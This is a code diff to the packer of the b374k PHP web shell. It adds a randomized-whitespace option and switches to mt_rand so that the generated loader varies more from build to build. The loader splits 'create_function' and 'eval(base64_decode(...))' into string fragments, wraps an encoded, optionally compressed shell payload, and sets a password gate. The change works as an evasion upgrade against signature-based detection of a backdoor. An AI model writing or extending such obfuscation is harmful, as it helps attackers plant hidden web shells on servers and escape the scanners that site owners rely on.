@@ -272,6 +272,7 @@ else{
 		$output .= "\t-t theme\t\t\t\ttheme to use\n";
 		$output .= "\t-m modules\t\t\t\tmodules to pack separated by comma\n";
 		$output .= "\t-s\t\t\t\t\tstrip comments and whitespaces\n";
+		$output .= "\t-r [0-9]\t\t\t\tnumber of space for randomization\n";
 		$output .= "\t-b\t\t\t\t\tencode with base64\n";
 		$output .= "\t-z [no|gzdeflate|gzencode|gzcompress]\tcompression (use only with -b)\n";
 		$output .= "\t-c [0-9]\t\t\t\tlevel of compression\n";
@@ -280,7 +281,7 @@ else{
 
 	}
 	else{
-		$opt = getopt("o:p:t:m:sbz:c:lk");
+		$opt = getopt("o:p:t:m:r:sbz:c:lk");
 
 		if(isset($opt['l'])){
 			$output .= "available modules : ".implode(",", $GLOBALS['packer']['module'])."\n\n";
@@ -317,6 +318,13 @@ else{
 		else $modules = explode("," ,$modules);
 
 		$strip = isset($opt['s'])? "yes":"no";
+		$space = isset($opt['r'])? trim($opt['r']):"";
+		if(empty($space)) $space = '0';
+		if(!preg_match("/^[0-9]{1}$/", $space)){
+			$output .= "error : unknown options -r ".$space." (use only 0-9)\n\n";
+			echo $output;
+			die();
+		}
 		$base64 = isset($opt['b'])? "yes":"no";
 
 		$compress = isset($opt['z'])? trim($opt['z']):"no";
@@ -347,6 +355,7 @@ else{
 		$output .= "Theme\t\t\t: ".$theme."\n";
 		$output .= "Modules\t\t\t: ".implode(",",$modules)."\n";
 		$output .= "Strip\t\t\t: ".$strip."\n";
+		$output .= "Space\t\t\t: ".$space."\n";
 		$output .= "Base64\t\t\t: ".$base64."\n";
 		if($base64=='yes') $output .= "Compression\t\t: ".$compress."\n";
 		if($base64=='yes') $output .= "Compression level\t: ".$compress_level."\n";
@@ -371,7 +380,7 @@ else{
 		$htmlcode = trim($layout);
 		$phpcode = "<?php ".trim($module_init)."?>".trim($base_code).trim($module_code);
 
-		$res = packer_b374k($outputfile, $phpcode, $htmlcode, $strip, $base64, $compress, $compress_level, $password);
+		$res = packer_b374k($outputfile, $phpcode, $htmlcode, $strip, $base64, $space, $compress, $compress_level, $password);
 		$status = explode("{[|b374k|]}", $res);
 		$output .= "Result\t\t\t: ".strip_tags($status[0])."\n\n";
 	}
@@ -504,15 +513,17 @@ function packer_pack_js($str){
  *
  * @author hex7c0 <hex7c0@gmail.com>
  * @param {String} $str - input string
+ * @param {Integer} $space - number of space
  * @return {String}
  */
-function rand_string($str){
+function rand_string($str,$space){
 	$len = strlen($str);
-	$index = rand(1,3);
+	$index = mt_rand(1,3);
 	$output = substr($str,0,$index);
 	for ($i = $index; $i < $len; $i+=$index) {
-		$index = rand(1,3);
-		$output .= "'.'";
+		$index = mt_rand(1,3);
+		$output .= "'.";
+		$output .= rand_space($space)."'";
 		$output .= substr($str,$i,$index);
 	}
 	return $output;
@@ -522,19 +533,32 @@ function rand_string($str){
  * randomization of function
  *
  * @author hex7c0 <hex7c0@gmail.com>
-  * @param {String} $var - function var
+ * @param {String} $var - function var
+ * @param {Integer} $space - number of space
  * @return {String}
  */
-function rand_fx($var){
+function rand_fx($var,$space){
 	$str = "reate_function";
 	$len = strlen($str);
 	$output = $var."=\"c";
 	for ($i = 0; $i < $len; $i+=$index) {
-		$index = rand(1,3);
-		$output .= "\".\"";
+		$index = mt_rand(1,3);
+		$output .= "\".";
+		$output .= rand_space($space)."\"";
 		$output .= substr($str,$i,$index);
 	}
 	return $output."\";";
+}
+
+/**
+ * generate random space
+ *
+ * @author hex7c0 <hex7c0@gmail.com>
+ * @param {Integer} $space - number of space
+ * @return {String}
+ */
+function rand_space($space){
+	return str_repeat(' ',mt_rand(0,$space));
 }
 
 /**
@@ -546,7 +570,7 @@ function rand_fx($var){
  */
 function rand_char($opt){
 	$az = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
-	$index = rand(0,strlen($az)-1);
+	$index = mt_rand(0,strlen($az)-1);
 	$try = "\$_".$az[$index];
 	if($opt && $opt==$try){
 		return rand_char($opt);
@@ -554,28 +578,13 @@ function rand_char($opt){
 	return $try;
 }
 
-/**
- * generate random space
- *
- * @author hex7c0 <hex7c0@gmail.com>
- * @return {String}
- */
-function rand_space(){
-	$len = rand(0,5);
-	$output = '';
-	for ($i = 0; $i < $len; $i++) {
-		$output .= ' ';
-	}
-	return $output;
-}
-
-function packer_b374k($output, $phpcode, $htmlcode, $strip, $base64, $compress, $compress_level, $password){
+function packer_b374k($output, $phpcode, $htmlcode, $strip, $base64, $space, $compress, $compress_level, $password){
 	$content = "";
 	if(is_file($output)){
 		if(!is_writable($output)) return "error : file ".$output." exists and is not writable{[|b374k|]}";
 	}
 
-	if(!empty($password)) $password = "\$GLOBALS['pass']=\"".sha1(md5($password))."\";";
+	if(!empty($password)) $password = "\$GLOBALS['pass']".rand_space($space)."=\"".sha1(md5($password))."\";";
 
 	$compress_level = (int) $compress_level;
 	if($compress_level<0) $compress_level = 0;
@@ -631,29 +640,29 @@ function packer_b374k($output, $phpcode, $htmlcode, $strip, $base64, $compress, 
 	if($base64=='yes'){
 		$content = base64_encode($content);
 		if($compress!='no'){
-			$encoder = rand_string($encoder_func."(base64_decode(").$b374k_x."))";
+			$encoder = rand_string($encoder_func."(base64_decode(",$space).$b374k_x."))";
 			/* $encoder = $encoder_func."(ba'.'se'.'64'.'_de'.'co'.'de(\$x))"; */
 		}
 		else{
-			$encoder = rand_string("base64_decode(").$b374k_x.")";
+			$encoder = rand_string("base64_decode(",$space).$b374k_x.")";
 			/* $encoder = "ba'.'se'.'64'.'_de'.'co'.'de(\"\$x\")"; */
 		}
 
 		/* "\$_fx=\"cr\".\"eat\".\"e_fun\".\"cti\".\"on\";" */
-		$code = $header.rand_space().rand_fx($b374k_f);
-		$code .= rand_space().$password.rand_space();
+		$code = $header.rand_space($space).rand_fx($b374k_f,$space);
+		$code .= rand_space($space).$password.rand_space($space);
 		$code .= $b374k_k."=".$b374k_f."('".$b374k_x."','";
-		$code .= rand_string("eval(")."\"?>\".".$encoder.");');".rand_space();
-		$code .= $b374k_k."('".$content."');".rand_space()."?>";
+		$code .= rand_string("eval(",$space)."\"?>\".".$encoder.");');".rand_space($space);
+		$code .= $b374k_k."('".$content."');".rand_space($space)."?>";
 		/* $code = $header.$password."\$func=\"cr\".\"eat\".\"e_fun\".\"cti\".\"on\";\$b374k=\$func('\$x','ev'.'al'.'(\"?>\".".$encoder.");');\$b374k(\"".$content."\");?>"; */
 
 	}
 	else{
 		if($compress!='no'){
-			$encoder = rand_string($encoder_func)."(\$x)";
+			$encoder = rand_string($encoder_func,$space)."(\$x)";
 		}
 		else{
-			$code = $header.rand_space().$password."?>".$content;
+			$code = $header.rand_space($space).$password."?>".$content;
 			$code = preg_replace("/\?>\s*<\?php\s*/", "", $code);
 		}
 	}
